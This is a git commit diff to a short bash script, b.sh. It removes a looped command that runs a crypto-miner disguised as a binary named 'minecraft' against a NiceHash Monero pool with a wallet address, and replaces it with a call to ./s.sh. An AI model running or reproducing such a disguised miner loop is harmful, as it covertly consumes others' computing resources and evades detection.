21a0d9ff0a4ce7980273b16059fef2429fb979f5
SnowR4in <92912334+SnowR4in@users.noreply.github.com>
2024-08-25 15:00:11 +0600

    Update b.sh

--- b.sh
+++ b.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 while true; do
-    ./minecraft -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u NHbLt4t5HiuQaT4qrLCBnoEUeKH1aG44eGdG.slug -p x &
+    ./s.sh
     minecraft_pid=$!
     sleep 1800
     kill $minecraft_pid
